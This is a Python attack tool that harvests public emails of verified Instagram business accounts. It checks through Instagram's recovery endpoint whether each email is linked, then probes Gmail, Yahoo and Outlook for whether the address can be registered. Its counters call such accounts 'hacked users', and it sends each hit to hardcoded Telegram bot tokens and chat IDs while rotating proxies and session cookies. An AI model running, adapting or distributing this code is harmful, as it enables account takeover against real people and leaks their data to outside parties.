try:
    import os,requests,time,uuid,secrets,random,string,threading,json,re,mechanize
    from login import funclo
except ModuleNotFoundError as m:
    m = str(m).split("'")[1]
    os.system(f"pip install {m}")


class ThisApp():
    def __init__(self):
        self.mr = requests.Session()
        self.str = string.digits+string.ascii_lowercase
        self.sp = time.sleep
        self.uid = str(uuid.uuid4())
        
        self.cookies = []
        self.proxies = []
        self.targets = []

        self.done = 0
        self.error = 0
        self.notvalid = 0
        self.users_checked = 0
        self.verfied_users = 0
        self.not_verfied = 0
        
        self.api = [
            '/usernameinfo/',
            '/info/'
        ]

        os.system('cls' if os.name == 'nt' else 'clear')
        
        self.get_cookies()
        
    def random_proxies(self):
        prx = random.choice(self.proxies)

        proxies = {
            'http':f'http://{prx}',
            'https':f'http://{prx}'
        }

        print(proxies)

        return proxies
    
    def printall(self):
        status = f'''
==========================
[+] total checked : {self.users_checked}
[+] hacked users : {self.done}
[+] not hacked users : {self.notvalid}
[+] error or blocked : {self.error}
[+] verified emails : {self.verfied_users}
[+] not verified emails : {self.not_verfied}
==========================
[*] all important info will be saved !!
        '''
        os.system('cls' if os.name == 'nt' else 'clear')
        print(status)
    

    def get_cookies(self):

        ask = int(input("[1] login // [2] use saved cookies : "))

        if ask == 1:
            funclo()
        else:
            pass

        for cookies in open('cookies.txt','r').read().splitlines():
            cki = eval(json.loads(json.dumps(cookies)))
            self.cookies.append(cki)
        numcki = len(self.cookies)
        print(f"Loaded {numcki} accounts")

        for prx in open('proxies.txt','r').read().splitlines():
            self.proxies.append(prx)
        
        numprx = len(self.proxies)
        print(f"Loaded {numprx} proxies")

        self.get_info()
    

    def get_info(self):

        while True:
            target = str(input("Target or X/x to skip: "))
            if 'X' in target or 'x' in target:
                break
            else:
                try:
                    req = self.mr.get(f"https://www.instagram.com/{target}/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'},cookies=random.choice(self.cookies))
                    idd = re.search(r'"logging_page_id":"(.*?)"',req.text).group(1).split('_')[1]
                    self.targets.append(idd)
                except Exception as e:
                    print(e)
                    print(f"{target} No user found")
        
        self.get_following()
    
    def check_valid(self,email,username):
        email_type = str(email).split('@')[1].split('.')[0]
        if email_type == "gmail":
    
                url = "https://android.clients.google.com/setup/checkavail"

                h = {
                'Content-Length':'98',
                'Content-Type':'text/plain; charset=UTF-8',
                'Host':'android.clients.google.com',
                'Connection':'Keep-Alive',
                'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
                }
                d = json.dumps({
                'username':email,
                'version':'3',
                'firstName':'AbaLahb',
                'lastName':'AbuJahl'
                })

                html = requests.post(url, headers=h,data=d)
                if  html.json()['status'] == 'SUCCESS':
                    send_telegram = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=358671541&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    send_telegram2 = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=688242188&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    res = self.r.get(send_telegram)
                    res = self.r.get(send_telegram2)
                    self.done+=1
                    with open("valid_users.txt",'a') as w:
                         w.write(f"hacked {username}:{email}\n")
                else:
                    self.notvalid+=1
                    
        elif email_type == 'yahoo':
    
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.addheaders = [
                    ('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6')]
                br.set_handle_robots(False)
                response = br.open(
                    "https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd")
                # assert br.viewing_html()
                br.select_form(nr=0)
                br["username"] = email
                br["passwd"] = "password"
                response = br.submit()

                if ('data-error="messages.INVALID_USERNAME"') in str(response.read()):
                    self.done+=1
                    send_telegram = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=358671541&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    send_telegram2 = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=688242188&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    res = self.r.get(send_telegram)
                    res = self.r.get(send_telegram2)
                    with open("valid_users.txt",'a') as w:
                         w.write(f"hacked {username}:{email}\n")
                else:
                    self.notvalid+=1
                    
        
        elif email_type == "hotmail" or email_type == "outlook":
                url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + \
                    email + "&_=1604288577990"

                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                req = self.r.get(url, headers=headers)

                if "Neither" in req.text:
                    self.done+=1
                    send_telegram = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=358671541&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    send_telegram2 = f'https://api.telegram.org/bot1890010427:AAHAFB2ygMyST76F8U0hLX5Tb-4KYlBW6S8/sendMessage?chat_id=688242188&text=𝐍𝐄𝐖 𝐕𝐀𝐈𝐋𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 \nusername : {username}\nemail : {email}\nBy Falcon'
                    res = self.r.get(send_telegram)
                    res = self.r.get(send_telegram2)
                    with open("valid_users.txt",'a') as w:
                        w.write(f"hacked {username}:{email}\n")
                else:
                    self.notvalid+=1
                    
        
        self.printall()
        
    def check_rest(self,user_or_email,username):
        url_check = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'

                    

        datacheck = {
                        '_csrftoken': 'missing',
                        'query': user_or_email,
                        '_uid': self.uid,
                        'adid': self.uid,
                        'guid': self.uid,
                        'device_id': 'android-'+self.uid,
                        '_uuid': self.uid,
                    }
        req_web = self.mr.post(url_check,data=datacheck,headers=self.headers) ## TODO ADD PEOXIES

        if ('''"message":"Sorry, we can't send you a login link. Please contact Instagram for more help.",''') in req_web.text:
            self.verfied_users+=1
            with open("linked_emails.txt","a") as wr:
                    wr.write(f"[+] Linked Email Found :{user_or_email}"+"\n")
            self.check_valid(user_or_email,username)
        elif req_web.status_code == 429:
             self.error+=1
             self.ts(15)
             return True
        elif ("We sent an email to") in req_web.text:
                self.not_verfied+=1
                return False
        else:
            self.not_verfied+=1
            with open("logs_error.txt","a") as wr:
                    wr.write(f"email:{user_or_email} \n respon:{req_web.text}"+"\n")
    
    def get_email(self,users):
        ran = random.choice(self.api)

        if ran == "/info/":

            req = self.mr.get(f"https://www.instagram.com/{users}/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'},cookies=random.choice(self.cookies))
            try:
                idd = re.search(r'"logging_page_id":"(.*?)"',req.text).group(1).split('_')[1]
                get_user1 = self.mr.get(
                        f"https://i.instagram.com/api/v1/users/{idd}/info/", headers=self.headers, cookies=random.choice(self.cookies),proxies=self.random_proxies(),timeout=10)
                get_user12 = get_user1.json()
                if get_user12['user']['is_business'] == True and str(get_user12['user']['public_email']) != "":
                    get_email1 = str(get_user12['user'].get('public_email'))
                    with open("all_emails.txt",'a') as w:
                        w.write(f"{get_email1}\n")
                    self.check_rest(get_email1,users)
                else:
                    pass
            except:
                self.error+=1
            

        elif ran == "/usernameinfo/":
            try:
                get_user1 = self.mr.get(
                    f"https://i.instagram.com/api/v1/users/{users}/usernameinfo/", headers=self.headers, cookies=random.choice(self.cookies),proxies=self.random_proxies(),timeout=10)
                get_user12 = get_user1.json()
                if get_user12['user']['is_business'] == True and str(get_user12['user']['public_email']) != "":
                    get_email1 = str(get_user12['user'].get('public_email'))
                    with open("all_emails.txt",'a') as w:
                        w.write(f"{get_email1}\n")
                    self.check_rest(get_email1,users)
                else:
                    pass
            except:
                self.error+=1
        

    def get_following(self):

        while True:

        ## ## ## ## TODO : START THREAD HERE FOR ALL TARGETS ## ## ## ##

            for target in self.targets:

                self.headers = {
                'X-Pigeon-Session-Id': str(uuid.uuid4()),
                'X-IG-Device-ID': str(uuid.uuid4()),
                'X-IG-App-Locale': 'en_US',
                'X-IG-Device-Locale': 'en_US',
                'X-IG-Mapped-Locale': 'en_US',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw8=',
                'User-Agent': 'Instagram 27.0.0.7.97 Android (28/9; 480dpi; 1080x2137; HUAWEI; JKM-LX1; HWJKM-H; kirin710; en_US; 216817344)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
                    }
                try:
                    url1 = f'https://i.instagram.com/api/v1/friendships/{target}/following/?rank_token='+self.uid

                    req = self.mr.get(url1, headers=self.headers,
                                cookies=random.choice(self.cookies),proxies=self.random_proxies(),timeout=10) # TODO ADD PROXIES proxies=self.random_proxies()
                    
                    for i in req.json()['users']:
                        self.users_checked+=1
                        self.sp(5)
                        self.printall()
                        if i["is_verified"] == True:
                            pk = i['pk']
                            with open('targets.txt','a') as  w:
                                w.write(f'{pk}\n')
                            user =  i['username']
                            self.targets.append(pk)
                            self.get_email(user)
                        else:
                            pass
                        

                except Exception as e:
                    print(e)
                    self.error+=1
                    continue

if __name__ == '__main__':
    ThisApp()
